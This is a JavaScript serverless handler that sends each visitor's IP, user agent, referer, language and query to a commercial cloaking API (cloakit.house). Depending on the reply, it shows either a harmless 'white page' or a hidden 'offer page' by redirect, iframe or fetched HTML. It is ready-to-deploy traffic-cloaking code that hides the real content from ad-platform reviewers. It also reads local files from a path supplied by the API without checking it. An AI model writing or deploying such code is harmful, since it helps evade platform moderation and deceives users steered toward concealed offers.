import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {

  function getRealIP() {
    const headers = [
      'cf-connecting-ip',
      'true-client-ip',
      'x-real-ip',
      'x-forwarded-for'
    ];
    for (const header of headers) {
      const val = req.headers[header];
      if (val) {
        const ips = val.split(',');
        for (let ip of ips) {
          ip = ip.trim().replace(/:\d+$/, '').replace(/^\[|\]$/g, '');
          if (isPublicIP(ip)) return ip;
        }
      }
    }
    return req.socket?.remoteAddress || '0.0.0.0';
  }

  function isPublicIP(ip) {
    if (!ip) return false;
    const privateRanges = [
      /^10\./, /^172\.(1[6-9]|2\d|3[01])\./, /^192\.168\./,
      /^127\./, /^::1$/, /^fc00:/i, /^fe80:/i
    ];
    return !privateRanges.some(r => r.test(ip));
  }

  // Serve a page — handles both remote URLs and local file paths
  async function servePage(urlOrPath, label) {
    const isRemoteURL = /^https?:\/\//i.test(urlOrPath);

    if (isRemoteURL) {
      try {
        const pageRes = await fetch(urlOrPath, { headers: { 'User-Agent': userAgent } });
        let html = await pageRes.text();
        html = html.replace('<head>', `<head><base href="${urlOrPath}" />`);
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.send(html);
      } catch {
        return res.status(404).send(`${label} Not Found.`);
      }
    } else {
      // Local file — read from project root
      try {
        const filePath = path.join(process.cwd(), urlOrPath);
        const html = fs.readFileSync(filePath, 'utf8');
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.send(html);
      } catch {
        return res.status(404).send(`${label} Not Found.`);
      }
    }
  }

  const userAgent = req.headers['user-agent'] || '';
  const referer   = req.headers['referer'] || '';
  const lang      = req.headers['accept-language'] || '';
  const query     = req.url?.includes('?') ? req.url.split('?')[1] : '';
  const ip        = getRealIP();

  const params = new URLSearchParams({
    label:      '9791eaaeb57257fca5fe9e6e36f88b06',
    user_agent: userAgent,
    referer:    referer,
    query:      query,
    lang:       lang,
    ip_address: ip
  });

  try {
    const apiRes = await fetch('https://cloakit.house/api/v1/check', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': userAgent
      },
      body: params.toString()
    });

    if (![200, 201, 204, 206].includes(apiRes.status)) {
      return res.status(200).send('Try again later or contact support.');
    }

    const body = await apiRes.json();

    // Flow errors
    if (body.filter_type) {
      const messages = {
        subscription_expired: 'Your Subscription Expired.',
        flow_deleted:         'Flow Deleted.',
        flow_banned:          'Flow Banned.'
      };
      if (messages[body.filter_type]) {
        return res.status(200).send(messages[body.filter_type]);
      }
    }

    if (!body.url_white_page || !body.url_offer_page) {
      return res.status(200).send('Offer Page or White Page Not Found.');
    }

    // ── Offer Page ──────────────────────────────────────────────────────────
    if (body.filter_page === 'offer') {
      if (body.mode_offer_page === 'redirect') {
        return res.redirect(302, body.url_offer_page);
      }
      if (body.mode_offer_page === 'iframe') {
        return res.send(
          `<iframe src="${body.url_offer_page}" width="100%" height="100%"></iframe>` +
          `<style>*{margin:0;padding:0;}body,html{height:100%;}iframe{border:0;display:block;width:100%;height:100%;}</style>`
        );
      }
      if (body.mode_offer_page === 'loading') {
        return await servePage(body.url_offer_page, 'Offer Page');
      }
    }

    // ── White Page ───────────────────────────────────────────────────────────
    if (body.filter_page === 'white') {
      if (body.mode_white_page === 'redirect') {
        return res.redirect(302, body.url_white_page);
      }
      if (body.mode_white_page === 'loading') {
        return await servePage(body.url_white_page, 'White Page');
      }
    }

  } catch (err) {
    return res.status(200).send('Try again later or contact support.');
  }
}
